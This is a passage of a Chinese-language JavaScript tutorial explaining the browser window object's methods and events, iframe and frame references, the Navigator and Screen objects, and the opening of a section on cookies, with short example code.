    > - `windowFeatures`：字符串，内容为逗号分隔的键值对（详见下文），表示新窗口的参数，比如有没有提示栏、工具条等等。如果省略，则默认打开一个完整 UI 的新窗口。如果新建的是一个已经存在的窗口，则该参数不起作用，浏览器沿用以前窗口的参数。
    >
    > 下面是一个例子。
    >
    > ```
    > var popup = window.open(
    >   'somepage.html',
    >   'DefinitionsWindows',
    >   'height=200,width=200,location=no,status=yes,resizable=yes,scrollbars=yes'
    > );
    > ```
    >
    > 上面代码表示，打开的新窗口高度和宽度都为200像素，没有地址栏，但有状态栏和滚动条，允许用户调整大小。
    >
    > 第三个参数可以设定如下属性。
    >
    > - left：新窗口距离屏幕最左边的距离（单位像素）。注意，新窗口必须是可见的，不能设置在屏幕以外的位置。
    > - top：新窗口距离屏幕最顶部的距离（单位像素）。
    > - height：新窗口内容区域的高度（单位像素），不得小于100。
    > - width：新窗口内容区域的宽度（单位像素），不得小于100。
    > - outerHeight：整个浏览器窗口的高度（单位像素），不得小于100。
    > - outerWidth：整个浏览器窗口的宽度（单位像素），不得小于100。
    > - menubar：是否显示菜单栏。
    > - toolbar：是否显示工具栏。
    > - location：是否显示地址栏。
    > - personalbar：是否显示用户自己安装的工具栏。
    > - status：是否显示状态栏。
    > - dependent：是否依赖父窗口。如果依赖，那么父窗口最小化，该窗口也最小化；父窗口关闭，该窗口也关闭。
    > - minimizable：是否有最小化按钮，前提是`dialog=yes`。
    > - noopener：新窗口将与父窗口切断联系，即新窗口的`window.opener`属性返回`null`，父窗口的`window.open()`方法也返回`null`。
    > - resizable：新窗口是否可以调节大小。
    > - scrollbars：是否允许新窗口出现滚动条。
    > - dialog：新窗口标题栏是否出现最大化、最小化、恢复原始大小的控件。
    > - titlebar：新窗口是否显示标题栏。
    > - alwaysRaised：是否显示在所有窗口的顶部。
    > - alwaysLowered：是否显示在父窗口的底下。
    > - close：新窗口是否显示关闭按钮。
    >
    > 对于那些可以打开和关闭的属性，设为`yes`或`1`或不设任何值就表示打开，比如`status=yes`、`status=1`、`status`都会得到同样的结果。如果想设为关闭，不用写`no`，而是直接省略这个属性即可。也就是说，如果在第三个参数中设置了一部分属性，其他没有被设置的`yes/no`属性都会被设成`no`，只有`titlebar`和关闭按钮除外（它们的值默认为`yes`）。
    >
    > 上面这些属性，属性名与属性值之间用等号连接，属性与属性之间用逗号分隔。
    >
    > ```
    > 'height=200,width=200,location=no,status=yes,resizable=yes,scrollbars=yes'
    > ```
    >
    > 另外，`open()`方法的第二个参数虽然可以指定已经存在的窗口，但是不等于可以任意控制其他窗口。为了防止被不相干的窗口控制，浏览器只有在两个窗口同源，或者目标窗口被当前网页打开的情况下，才允许`open`方法指向该窗口。
    >
    > `window.open`方法返回新窗口的引用。
    >
    > ```
    > var windowB = window.open('windowB.html', 'WindowB');
    > windowB.window.name // "WindowB"
    > ```
    >
    > 注意，如果新窗口和父窗口不是同源的（即不在同一个域），它们彼此不能获取对方窗口对象的内部属性。
    >
    > 下面是另一个例子。
    >
    > ```
    > var w = window.open();
    > console.log('已经打开新窗口');
    > w.location = 'http://example.com';
    > ```
    >
    > 上面代码先打开一个新窗口，然后在该窗口弹出一个对话框，再将网址导向`example.com`。
    >
    > 由于`open`这个方法很容易被滥用，许多浏览器默认都不允许脚本自动新建窗口。只允许在用户点击链接或按钮时，脚本做出反应，弹出新窗口。因此，有必要检查一下打开新窗口是否成功。
    >
    > ```
    > var popup = window.open();
    > if (popup === null) {
    >   // 新建窗口失败
    > }
    > ```
    >
    > **（2）window.close()**
    >
    > `window.close`方法用于关闭当前窗口，一般只用来关闭`window.open`方法新建的窗口。
    >
    > ```
    > popup.close()
    > ```
    >
    > 该方法只对顶层窗口有效，`iframe`框架之中的窗口使用该方法无效。
    >
    > **（3）window.stop()**
    >
    > `window.stop()`方法完全等同于单击浏览器的停止按钮，会停止加载图像、视频等正在或等待加载的对象。
    >
    > ```
    > window.stop()
    > ```
    >
    > ### window.moveTo()，window.moveBy()
    >
    > `window.moveTo()`方法用于移动浏览器窗口到指定位置。它接受两个参数，分别是窗口左上角距离屏幕左上角的水平距离和垂直距离，单位为像素。
    >
    > ```
    > window.moveTo(100, 200)
    > ```
    >
    > 上面代码将窗口移动到屏幕`(100, 200)`的位置。
    >
    > `window.moveBy()`方法将窗口移动到一个相对位置。它接受两个参数，分别是窗口左上角向右移动的水平距离和向下移动的垂直距离，单位为像素。
    >
    > ```
    > window.moveBy(25, 50)
    > ```
    >
    > 上面代码将窗口向右移动25像素、向下移动50像素。
    >
    > 为了防止有人滥用这两个方法，随意移动用户的窗口，目前只有一种情况，浏览器允许用脚本移动窗口：该窗口是用`window.open()`方法新建的，并且窗口里只有它一个 Tab 页。除此以外的情况，使用上面两个方法都是无效的。
    >
    > ### window.resizeTo()，window.resizeBy()
    >
    > `window.resizeTo()`方法用于缩放窗口到指定大小。
    >
    > 它接受两个参数，第一个是缩放后的窗口宽度（`outerWidth`属性，包含滚动条、标题栏等等），第二个是缩放后的窗口高度（`outerHeight`属性）。
    >
    > ```
    > window.resizeTo(
    >   window.screen.availWidth / 2,
    >   window.screen.availHeight / 2
    > )
    > ```
    >
    > 上面代码将当前窗口缩放到，屏幕可用区域的一半宽度和高度。
    >
    > `window.resizeBy()`方法用于缩放窗口。它与`window.resizeTo()`的区别是，它按照相对的量缩放，`window.resizeTo()`需要给出缩放后的绝对大小。
    >
    > 它接受两个参数，第一个是水平缩放的量，第二个是垂直缩放的量，单位都是像素。
    >
    > ```
    > window.resizeBy(-200, -200)
    > ```
    >
    > 上面的代码将当前窗口的宽度和高度，都缩小200像素。
    >
    > ### window.scrollTo()，window.scroll()，window.scrollBy()
    >
    > `window.scrollTo`方法用于将文档滚动到指定位置。它接受两个参数，表示滚动后位于窗口左上角的页面坐标。
    >
    > ```
    > window.scrollTo(x-coord, y-coord)
    > ```
    >
    > 它也可以接受一个配置对象作为参数。
    >
    > ```
    > window.scrollTo(options)
    > ```
    >
    > 配置对象`options`有三个属性。
    >
    > - `top`：滚动后页面左上角的垂直坐标，即 y 坐标。
    > - `left`：滚动后页面左上角的水平坐标，即 x 坐标。
    > - `behavior`：字符串，表示滚动的方式，有三个可能值（`smooth`、`instant`、`auto`），默认值为`auto`。
    >
    > ```
    > window.scrollTo({
    >   top: 1000,
    >   behavior: 'smooth'
    > });
    > ```
    >
    > `window.scroll()`方法是`window.scrollTo()`方法的别名。
    >
    > `window.scrollBy()`方法用于将网页滚动指定距离（单位像素）。它接受两个参数：水平向右滚动的像素，垂直向下滚动的像素。
    >
    > ```
    > window.scrollBy(0, window.innerHeight)
    > ```
    >
    > 上面代码用于将网页向下滚动一屏。
    >
    > 如果不是要滚动整个文档，而是要滚动某个元素，可以使用下面三个属性和方法。
    >
    > - Element.scrollTop
    > - Element.scrollLeft
    > - Element.scrollIntoView()
    >
    > ### window.print()
    >
    > `window.print`方法会跳出打印对话框，与用户点击菜单里面的“打印”命令效果相同。
    >
    > 常见的打印按钮代码如下。
    >
    > ```
    > document.getElementById('printLink').onclick = function () {
    >   window.print();
    > }
    > ```
    >
    > 非桌面设备（比如手机）可能没有打印功能，这时可以这样判断。
    >
    > ```
    > if (typeof window.print === 'function') {
    >   // 支持打印功能
    > }
    > ```
    >
    > ### window.focus()，window.blur()
    >
    > `window.focus()`方法会激活窗口，使其获得焦点，出现在其他窗口的前面。
    >
    > ```
    > var popup = window.open('popup.html', 'Popup Window');
    > 
    > if ((popup !== null) && !popup.closed) {
    >   popup.focus();
    > }
    > ```
    >
    > 上面代码先检查`popup`窗口是否依然存在，确认后激活该窗口。
    >
    > `window.blur()`方法将焦点从窗口移除。
    >
    > 当前窗口获得焦点时，会触发`focus`事件；当前窗口失去焦点时，会触发`blur`事件。
    >
    > ### window.getSelection()
    >
    > `window.getSelection`方法返回一个`Selection`对象，表示用户现在选中的文本。
    >
    > ```
    > var selObj = window.getSelection();
    > ```
    >
    > 使用`Selection`对象的`toString`方法可以得到选中的文本。
    >
    > ```
    > var selectedText = selObj.toString();
    > ```
    >
    > ### window.getComputedStyle()，window.matchMedia()
    >
    > `window.getComputedStyle()`方法接受一个元素节点作为参数，返回一个包含该元素的最终样式信息的对象，详见《CSS 操作》一章。
    >
    > `window.matchMedia()`方法用来检查 CSS 的`mediaQuery`语句，详见《CSS 操作》一章。
    >
    > ### window.requestAnimationFrame()
    >
    > `window.requestAnimationFrame()`方法跟`setTimeout`类似，都是推迟某个函数的执行。不同之处在于，`setTimeout`必须指定推迟的时间，`window.requestAnimationFrame()`则是推迟到浏览器下一次重流时执行，执行完才会进行下一次重绘。重绘通常是 16ms 执行一次，不过浏览器会自动调节这个速率，比如网页切换到后台 Tab 页时，`requestAnimationFrame()`会暂停执行。
    >
    > 如果某个函数会改变网页的布局，一般就放在`window.requestAnimationFrame()`里面执行，这样可以节省系统资源，使得网页效果更加平滑。因为慢速设备会用较慢的速率重流和重绘，而速度更快的设备会有更快的速率。
    >
    > 该方法接受一个回调函数作为参数。
    >
    > ```
    > window.requestAnimationFrame(callback)
    > ```
    >
    > 上面代码中，`callback`是一个回调函数。`callback`执行时，它的参数就是系统传入的一个高精度时间戳（`performance.now()`的返回值），单位是毫秒，表示距离网页加载的时间。
    >
    > `window.requestAnimationFrame()`的返回值是一个整数，这个整数可以传入`window.cancelAnimationFrame()`，用来取消回调函数的执行。
    >
    > 下面是一个`window.requestAnimationFrame()`执行网页动画的例子。
    >
    > ```
    > var element = document.getElementById('animate');
    > element.style.position = 'absolute';
    > 
    > var start = null;
    > 
    > function step(timestamp) {
    >   if (!start) start = timestamp;
    >   var progress = timestamp - start;
    >   // 元素不断向右移，最大不超过200像素
    >   element.style.left = Math.min(progress / 10, 200) + 'px';
    >   // 如果距离第一次执行不超过 2000 毫秒，
    >   // 就继续执行动画
    >   if (progress < 2000) {
    >     window.requestAnimationFrame(step);
    >   }
    > }
    > 
    > window.requestAnimationFrame(step);
    > ```
    >
    > 上面代码定义了一个网页动画，持续时间是2秒，会让元素向右移动。
    >
    > ### window.requestIdleCallback()
    >
    > `window.requestIdleCallback()`跟`setTimeout`类似，也是将某个函数推迟执行，但是它保证将回调函数推迟到系统资源空闲时执行。也就是说，如果某个任务不是很关键，就可以使用`window.requestIdleCallback()`将其推迟执行，以保证网页性能。
    >
    > 它跟`window.requestAnimationFrame()`的区别在于，后者指定回调函数在下一次浏览器重排时执行，问题在于下一次重排时，系统资源未必空闲，不一定能保证在16毫秒之内完成；`window.requestIdleCallback()`可以保证回调函数在系统资源空闲时执行。
    >
    > 该方法接受一个回调函数和一个配置对象作为参数。配置对象可以指定一个推迟执行的最长时间，如果过了这个时间，回调函数不管系统资源有无空闲，都会执行。
    >
    > ```
    > window.requestIdleCallback(callback[, options])
    > ```
    >
    > `callback`参数是一个回调函数。该回调函数执行时，系统会传入一个`IdleDeadline`对象作为参数。`IdleDeadline`对象有一个`didTimeout`属性（布尔值，表示是否为超时调用）和一个`timeRemaining()`方法（返回该空闲时段剩余的毫秒数）。
    >
    > `options`参数是一个配置对象，目前只有`timeout`一个属性，用来指定回调函数推迟执行的最大毫秒数。该参数可选。
    >
    > `window.requestIdleCallback()`方法返回一个整数。该整数可以传入`window.cancelIdleCallback()`取消回调函数。
    >
    > 下面是一个例子。
    >
    > ```
    > requestIdleCallback(myNonEssentialWork);
    > 
    > function myNonEssentialWork(deadline) {
    >   while (deadline.timeRemaining() > 0) {
    >     doWorkIfNeeded();
    >   }
    > }
    > ```
    >
    > 上面代码中，`requestIdleCallback()`用来执行非关键任务`myNonEssentialWork`。该任务先确认本次空闲时段有剩余时间，然后才真正开始执行任务。
    >
    > 下面是指定`timeout`的例子。
    >
    > ```
    > requestIdleCallback(processPendingAnalyticsEvents, { timeout: 2000 });
    > ```
    >
    > 上面代码指定，`processPendingAnalyticsEvents`必须在未来2秒之内执行。
    >
    > 如果由于超时导致回调函数执行，则`deadline.timeRemaining()`返回`0`，`deadline.didTimeout`返回`true`。
    >
    > 如果多次执行`window.requestIdleCallback()`，指定多个回调函数，那么这些回调函数将排成一个队列，按照先进先出的顺序执行。
    >
    > ## 事件
    >
    > `window`对象可以接收以下事件。
    >
    > ### load 事件和 onload 属性
    >
    > `load`事件发生在文档在浏览器窗口加载完毕时。`window.onload`属性可以指定这个事件的回调函数。
    >
    > ```
    > window.onload = function() {
    >   var elements = document.getElementsByClassName('example');
    >   for (var i = 0; i < elements.length; i++) {
    >     var elt = elements[i];
    >     // ...
    >   }
    > };
    > ```
    >
    > 上面代码在网页加载完毕后，获取指定元素并进行处理。
    >
    > ### error 事件和 onerror 属性
    >
    > 浏览器脚本发生错误时，会触发`window`对象的`error`事件。我们可以通过`window.onerror`属性对该事件指定回调函数。
    >
    > ```
    > window.onerror = function (message, filename, lineno, colno, error) {
    >   console.log("出错了！--> %s", error.stack);
    > };
    > ```
    >
    > 由于历史原因，`window`的`error`事件的回调函数不接受错误对象作为参数，而是一共可以接受五个参数，它们的含义依次如下。
    >
    > - 出错信息
    > - 出错脚本的网址
    > - 行号
    > - 列号
    > - 错误对象
    >
    > 老式浏览器只支持前三个参数。
    >
    > 并不是所有的错误，都会触发 JS 的`error`事件（即让 JS 报错）。一般来说，只有 JS 脚本的错误，才会触发这个事件，而像资源文件不存在之类的错误，都不会触发。
    >
    > 下面是一个例子，如果整个页面未捕获错误超过3个，就显示警告。
    >
    > ```
    > window.onerror = function(msg, url, line) {
    >   if (onerror.num++ > onerror.max) {
    >     alert('ERROR: ' + msg + '\n' + url + ':' + line);
    >     return true;
    >   }
    > }
    > onerror.max = 3;
    > onerror.num = 0;
    > ```
    >
    > 需要注意的是，如果脚本网址与网页网址不在同一个域（比如使用了 CDN），浏览器根本不会提供详细的出错信息，只会提示出错，错误类型是“Script error.”，行号为0，其他信息都没有。这是浏览器防止向外部脚本泄漏信息。一个解决方法是在脚本所在的服务器，设置`Access-Control-Allow-Origin`的 HTTP 头信息。
    >
    > ```
    > Access-Control-Allow-Origin: *
    > ```
    >
    > 然后，在网页的`<script>`标签中设置`crossorigin`属性。
    >
    > ```
    > <script crossorigin="anonymous" src="//example.com/file.js"></script>
    > ```
    >
    > 上面代码的`crossorigin="anonymous"`表示，读取文件不需要身份信息，即不需要 cookie 和 HTTP 认证信息。如果设为`crossorigin="use-credentials"`，就表示浏览器会上传 cookie 和 HTTP 认证信息，同时还需要服务器端打开 HTTP 头信息`Access-Control-Allow-Credentials`。
    >
    > ### window 对象的事件监听属性
    >
    > 除了具备元素节点都有的 GlobalEventHandlers 接口，`window`对象还具有以下的事件监听函数属性。
    >
    > - `window.onafterprint`：`afterprint`事件的监听函数。
    > - `window.onbeforeprint`：`beforeprint`事件的监听函数。
    > - `window.onbeforeunload`：`beforeunload`事件的监听函数。
    > - `window.onhashchange`：`hashchange`事件的监听函数。
    > - `window.onlanguagechange`: `languagechange`的监听函数。
    > - `window.onmessage`：`message`事件的监听函数。
    > - `window.onmessageerror`：`MessageError`事件的监听函数。
    > - `window.onoffline`：`offline`事件的监听函数。
    > - `window.ononline`：`online`事件的监听函数。
    > - `window.onpagehide`：`pagehide`事件的监听函数。
    > - `window.onpageshow`：`pageshow`事件的监听函数。
    > - `window.onpopstate`：`popstate`事件的监听函数。
    > - `window.onstorage`：`storage`事件的监听函数。
    > - `window.onunhandledrejection`：未处理的 Promise 对象的`reject`事件的监听函数。
    > - `window.onunload`：`unload`事件的监听函数。
    >
    > ## 多窗口操作
    >
    > 由于网页可以使用`iframe`元素，嵌入其他网页，因此一个网页之中会形成多个窗口。如果子窗口之中又嵌入别的网页，就会形成多级窗口。
    >
    > ### 窗口的引用
    >
    > 各个窗口之中的脚本，可以引用其他窗口。浏览器提供了一些特殊变量，用来返回其他窗口。
    >
    > - `top`：顶层窗口，即最上层的那个窗口
    > - `parent`：父窗口
    > - `self`：当前窗口，即自身
    >
    > 下面代码可以判断，当前窗口是否为顶层窗口。
    >
    > ```
    > if (window.top === window.self) {
    >   // 当前窗口是顶层窗口
    > } else {
    >   // 当前窗口是子窗口
    > }
    > ```
    >
    > 下面的代码让父窗口的访问历史后退一次。
    >
    > ```
    > window.parent.history.back();
    > ```
    >
    > 与这些变量对应，浏览器还提供一些特殊的窗口名，供`window.open()`方法、`<a>`标签、`<form>`标签等引用。
    >
    > - `_top`：顶层窗口
    > - `_parent`：父窗口
    > - `_blank`：新窗口
    >
    > 下面代码就表示在顶层窗口打开链接。
    >
    > ```
    > <a href="somepage.html" target="_top">Link</a>
    > ```
    >
    > ### iframe 元素
    >
    > 对于`iframe`嵌入的窗口，`document.getElementById`方法可以拿到该窗口的 DOM 节点，然后使用`contentWindow`属性获得`iframe`节点包含的`window`对象。
    >
    > ```
    > var frame = document.getElementById('theFrame');
    > var frameWindow = frame.contentWindow;
    > ```
    >
    > 上面代码中，`frame.contentWindow`可以拿到子窗口的`window`对象。然后，在满足同源限制的情况下，可以读取子窗口内部的属性。
    >
    > ```js
    > // 获取子窗口的标题
    > frameWindow.title
    > ```
    >
    > `<iframe`元素的`contentDocument`属性，可以拿到子窗口的`document`对象。
    >
    > ```js
    > var frame = document.getElementById('theFrame');
    > var frameDoc = frame.contentDocument;
    > 
    > // 等同于
    > var frameDoc = frame.contentWindow.document;
    > ```
    >
    > `<iframe>`元素遵守同源政策，只有当父窗口与子窗口在同一个域时，两者之间才可以用脚本通信，否则只有使用`window.postMessage`方法。
    >
    > `<iframe>`窗口内部，使用`window.parent`引用父窗口。如果当前页面没有父窗口，则`window.parent`属性返回自身。因此，可以通过`window.parent`是否等于`window.self`，判断当前窗口是否为`iframe`窗口。
    >
    > ```js
    > if (window.parent !== window.self) {
    >   // 当前窗口是子窗口
    > }
    > ```
    >
    > `<iframe>`窗口的`window`对象，有一个`frameElement`属性，返回`<iframe>`在父窗口中的 DOM 节点。对于非嵌入的窗口，该属性等于`null`。
    >
    > ```js
    > var f1Element = document.getElementById('f1');
    > var f1Window = f1Element.contentWindow;
    > 
    > f1Window.frameElement === f1Element // true
    > window.frameElement === null // true
    > ```
    >
    > ### window.frames 属性
    >
    > `window.frames`属性返回一个类似数组的对象，成员是所有子窗口的`window`对象。可以使用这个属性，实现窗口之间的互相引用。比如，`frames[0]`返回第一个子窗口，`frames[1].frames[2]`返回第二个子窗口内部的第三个子窗口，`parent.frames[1]`返回父窗口的第二个子窗口。
    >
    > 注意，`window.frames`每个成员的值，是框架内的窗口（即框架的`window`对象），而不是`iframe`标签在父窗口的 DOM 节点。如果要获取每个框架内部的 DOM 树，需要使用`window.frames[0].document`的写法。
    >
    > 另外，如果`<iframe>`元素设置了`name`或`id`属性，那么属性值会自动成为全局变量，并且可以通过`window.frames`属性引用，返回子窗口的`window`对象。
    >
    > ```
    > // HTML 代码为 <iframe id="myFrame">
    > window.myFrame // [HTMLIFrameElement]
    > frames.myframe === myFrame // true
    > ```
    >
    > 另外，`name`属性的值会自动成为子窗口的名称，可以用在`window.open`方法的第二个参数，或者`<a>`和`<frame>`标签的`target`属性。

  - Navigator 对象，Screen 对象

    > `window.navigator`属性指向一个包含浏览器和系统信息的 Navigator 对象。脚本通过这个属性了解用户的环境信息。
    >
    > ## Navigator 对象的属性
    >
    > ### Navigator.userAgent
    >
    > `navigator.userAgent`属性返回浏览器的 User Agent 字符串，表示用户设备信息，包含了浏览器的厂商、版本、操作系统等信息。
    >
    > 下面是 Chrome 浏览器的`userAgent`。
    >
    > ```
    > navigator.userAgent
    > // "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36"
    > ```
    >
    > 通过`userAgent`属性识别浏览器，不是一个好办法。因为必须考虑所有的情况（不同的浏览器，不同的版本），非常麻烦，而且用户可以改变这个字符串。这个字符串的格式并无统一规定，也无法保证未来的适用性，各种上网设备层出不穷，难以穷尽。所以，现在一般不再通过它识别浏览器了，而是使用“功能识别”方法，即逐一测试当前浏览器是否支持要用到的 JS 功能。
    >
    > 不过，通过`userAgent`可以大致准确地识别手机浏览器，方法就是测试是否包含`mobi`字符串。
    >
    > ```
    > var ua = navigator.userAgent.toLowerCase();
    > 
    > if (/mobi/.test(ua)) {
    >   // 手机浏览器
    > } else {
    >   // 非手机浏览器
    > }
    > ```
    >
    > 如果想要识别所有移动设备的浏览器，可以测试更多的特征字符串。
    >
    > ```
    > /mobi|android|touch|mini/.test(ua)
    > ```
    >
    > ### Navigator.plugins
    >
    > `Navigator.plugins`属性返回一个类似数组的对象，成员是 Plugin 实例对象，表示浏览器安装的插件，比如 Flash、ActiveX 等。
    >
    > ```
    > var pluginsLength = navigator.plugins.length;
    > 
    > for (var i = 0; i < pluginsLength; i++) {
    >   console.log(navigator.plugins[i].name);
    >   console.log(navigator.plugins[i].filename);
    >   console.log(navigator.plugins[i].description);
    >   console.log(navigator.plugins[i].version);
    > }
    > ```
    >
    > ### Navigator.platform
    >
    > `Navigator.platform`属性返回用户的操作系统信息，比如`MacIntel`、`Win32`、`Linux x86_64`等 。
    >
    > ```
    > navigator.platform
    > // "Linux x86_64"
    > ```
    >
    > ### Navigator.onLine
    >
    > `navigator.onLine`属性返回一个布尔值，表示用户当前在线还是离线（浏览器断线）。
    >
    > ```
    > navigator.onLine // true
    > ```
    >
    > 有时，浏览器可以连接局域网，但是局域网不能连通外网。这时，有的浏览器的`onLine`属性会返回`true`，所以不能假定只要是`true`，用户就一定能访问互联网。不过，如果是`false`，可以断定用户一定离线。
    >
    > 用户变成在线会触发`online`事件，变成离线会触发`offline`事件，可以通过`window.ononline`和`window.onoffline`指定这两个事件的回调函数。
    >
    > ```
    > window.addEventListener('offline', function(e) { console.log('offline'); });
    > window.addEventListener('online', function(e) { console.log('online'); });
    > ```
    >
    > ### Navigator.language，Navigator.languages
    >
    > `Navigator.language`属性返回一个字符串，表示浏览器的首选语言。该属性只读。
    >
    > ```
    > navigator.language // "en"
    > ```
    >
    > `Navigator.languages`属性返回一个数组，表示用户可以接受的语言。`Navigator.language`总是这个数组的第一个成员。HTTP 请求头信息的`Accept-Language`字段，就来自这个数组。
    >
    > ```
    > navigator.languages  // ["en-US", "en", "zh-CN", "zh", "zh-TW"]
    > ```
    >
    > 如果这个属性发生变化，就会在`window`对象上触发`languagechange`事件。
    >
    > ### Navigator.geolocation
    >
    > `Navigator.geolocation`属性返回一个 Geolocation 对象，包含用户地理位置的信息。注意，该 API 只有在 HTTPS 协议下可用，否则调用下面方法时会报错。
    >
    > Geolocation 对象提供下面三个方法。
    >
    > - Geolocation.getCurrentPosition()：得到用户的当前位置
    > - Geolocation.watchPosition()：监听用户位置变化
    > - Geolocation.clearWatch()：取消`watchPosition()`方法指定的监听函数
    >
    > 注意，调用这三个方法时，浏览器会跳出一个对话框，要求用户给予授权。
    >
    > ### Navigator.cookieEnabled
    >
    > `navigator.cookieEnabled`属性返回一个布尔值，表示浏览器的 Cookie 功能是否打开。
    >
    > ```
    > navigator.cookieEnabled // true
    > ```
    >
    > 注意，这个属性反映的是浏览器总的特性，与是否储存某个具体的网站的 Cookie 无关。用户可以设置某个网站不得储存 Cookie，这时`cookieEnabled`返回的还是`true`。
    >
    > ## Navigator 对象的方法
    >
    > ### Navigator.javaEnabled()
    >
    > `navigator.javaEnabled()`方法返回一个布尔值，表示浏览器是否能运行 Java Applet 小程序。
    >
    > ```
    > navigator.javaEnabled() // false
    > ```
    >
    > ### Navigator.sendBeacon()
    >
    > `Navigator.sendBeacon()`方法用于向服务器异步发送数据，详见《XMLHttpRequest 对象》一章。
    >
    > ## Navigator 的实验性属性
    >
    > Navigator 对象有一些实验性属性，在部分浏览器可用。
    >
    > ### Navigator.deviceMemory
    >
    > `navigator.deviceMemory`属性返回当前计算机的内存数量（单位为 GB）。该属性只读，只在 HTTPS 环境下可用。
    >
    > 它的返回值是一个近似值，四舍五入到最接近的2的幂，通常是 0.25、0.5、1、2、4、8。实际内存超过 8GB，也返回`8`。
    >
    > ```
    > if (navigator.deviceMemory > 1) {
    >   await import('./costly-module.js');
    > }
    > ```
    >
    > 上面示例中，只有当前内存大于 1GB，才加载大型的脚本。
    >
    > ### Navigator.hardwareConcurrency
    >
    > `navigator.hardwareConcurrency`属性返回用户计算机上可用的逻辑处理器的数量。该属性只读。
    >
    > 现代计算机的 CPU 有多个物理核心，每个物理核心有时支持一次运行多个线程。因此，四核 CPU 可以提供八个逻辑处理器核心。
    >
    > ```
    > if (navigator.hardwareConcurrency > 4) {
    >   await import('./costly-module.js');
    > }
    > ```
    >
    > 上面示例中，可用的逻辑处理器大于4，才会加载大型脚本。
    >
    > 该属性通过用于创建 Web Worker，每个可用的逻辑处理器都创建一个 Worker。
    >
    > ```
    > let workerList = [];
    > 
    > for (let i = 0; i < window.navigator.hardwareConcurrency; i++) {
    >   let newWorker = {
    >     worker: new Worker('cpuworker.js'),
    >     inUse: false
    >   };
    >   workerList.push(newWorker);
    > }
    > ```
    >
    > 上面示例中，有多少个可用的逻辑处理器，就创建多少个 Web Worker。
    >
    > ### Navigator.connection
    >
    > `navigator.connection`属性返回一个对象，包含当前网络连接的相关信息。
    >
    > - downlink：有效带宽估计值（单位：兆比特/秒，Mbps），四舍五入到每秒 25KB 的最接近倍数。
    > - downlinkMax：当前连接的最大下行链路速度（单位：兆比特每秒，Mbps）。
    > - effectiveType：返回连接的等效类型，可能的值为`slow-2g`、`2g`、`3g`、`4g`。
    > - rtt：当前连接的估计有效往返时间，四舍五入到最接近的25毫秒的倍数。
    > - saveData：用户是否设置了浏览器的减少数据使用量选项（比如不加载图片），返回`true`或者`false`。
    > - type：当前连接的介质类型，可能的值为`bluetooth`、`cellular`、`ethernet`、`none`、`wifi`、`wimax`、`other`、`unknown`。
    >
    > ```
    > if (navigator.connection.effectiveType === '4g') {
    >   await import('./costly-module.js');
    > }
    > ```
    >
    > 上面示例中，如果网络连接是 4G，则加载大型脚本。
    >
    > ## Screen 对象
    >
    > Screen 对象表示当前窗口所在的屏幕，提供显示设备的信息。`window.screen`属性指向这个对象。
    >
    > 该对象有下面的属性。
    >
    > - `Screen.height`：浏览器窗口所在的屏幕的高度（单位像素）。除非调整显示器的分辨率，否则这个值可以看作常量，不会发生变化。显示器的分辨率与浏览器设置无关，缩放网页并不会改变分辨率。
    > - `Screen.width`：浏览器窗口所在的屏幕的宽度（单位像素）。
    > - `Screen.availHeight`：浏览器窗口可用的屏幕高度（单位像素）。因为部分空间可能不可用，比如系统的任务栏或者 Mac 系统屏幕底部的 Dock 区，这个属性等于`height`减去那些被系统组件的高度。
    > - `Screen.availWidth`：浏览器窗口可用的屏幕宽度（单位像素）。
    > - `Screen.pixelDepth`：整数，表示屏幕的色彩位数，比如`24`表示屏幕提供24位色彩。
    > - `Screen.colorDepth`：`Screen.pixelDepth`的别名。严格地说，colorDepth 表示应用程序的颜色深度，pixelDepth 表示屏幕的颜色深度，绝大多数情况下，它们都是同一件事。
    > - `Screen.orientation`：返回一个对象，表示屏幕的方向。该对象的`type`属性是一个字符串，表示屏幕的具体方向，`landscape-primary`表示横放，`landscape-secondary`表示颠倒的横放，`portrait-primary`表示竖放，`portrait-secondary`表示颠倒的竖放。
    >
    > 下面是`Screen.orientation`的例子。
    >
    > ```
    > window.screen.orientation
    > // { angle: 0, type: "landscape-primary", onchange: null }
    > ```
    >
    > 下面的例子保证屏幕分辨率大于 1024 x 768。
    >
    > ```
    > if (window.screen.width >= 1024 && window.screen.height >= 768) {
    >   // 分辨率不低于 1024x768
    > }
    > ```
    >
    > 下面是根据屏幕的宽度，将用户导向不同网页的代码。
    >
    > ```
    > if ((screen.width <= 800) && (screen.height <= 600)) {
    >   window.location.replace('small.html');
    > } else {
    >   window.location.replace('wide.html');
    > }
    > ```

  - Cookie

    > ## 概述
    >
    > Cookie 是服务器保存在浏览器的一小段文本信息，一般大小不能超过4KB。浏览器每次向服务器发出请求，就会自动附上这段信息。
    >
    > HTTP 协议不带有状态，有些请求需要区分状态，就通过 Cookie 附带字符串，让服务器返回不一样的回应。举例来说，用户登录以后，服务器往往会在网站上留下一个 Cookie，记录用户编号（比如`id=1234`），以后每次浏览器向服务器请求数据，就会带上这个字符串，服务器从而知道是谁在请求，应该回应什么内容。
    >
    > Cookie 的目的就是区分用户，以及放置状态信息，它的使用场景主要如下。
    >
    > - 对话（session）管理：保存登录状态、购物车等需要记录的信息。
    > - 个性化信息：保存用户的偏好，比如网页的字体大小、背景色等等。
    > - 追踪用户：记录和分析用户行为。
    >
    > Cookie 不是一种理想的客户端存储机制。它的容量很小（4KB），缺乏数据操作接口，而且会影响性能。客户端存储建议使用 Web storage API 和 IndexedDB。只有那些每次请求都需要让服务器知道的信息，才应该放在 Cookie 里面。
    >
    > 每个 Cookie 都有以下几方面的元数据。
    >
    > - Cookie 的名字
    > - Cookie 的值（真正的数据写在这里面）
    > - 到期时间（超过这个时间会失效）
    > - 所属域名（默认为当前域名）
    > - 生效的路径（默认为当前网址）
    >
    > 举例来说，用户访问网址`www.example.com`，服务器在浏览器写入一个 Cookie。这个 Cookie 的所属域名为`www.example.com`，生效路径为根路径`/`。
    >
    > 如果 Cookie 的生效路径设为`/forums`，那么这个 Cookie 只有在访问`www.example.com/forums`及其子路径时才有效。以后，浏览器访问某个路径之前，就会找出对该域名和路径有效，并且还没有到期的 Cookie，一起发送给服务器。
    >
    > 用户可以设置浏览器不接受 Cookie，也可以设置不向服务器发送 Cookie。`window.navigator.cookieEnabled`属性返回一个布尔值，表示浏览器是否打开 Cookie 功能。
    >
    > ```
    > window.navigator.cookieEnabled // true
    > ```
    >
    > `document.cookie`属性返回当前网页的 Cookie。
    >
    > ```
    > document.cookie // "id=foo;key=bar"
    > ```
    >
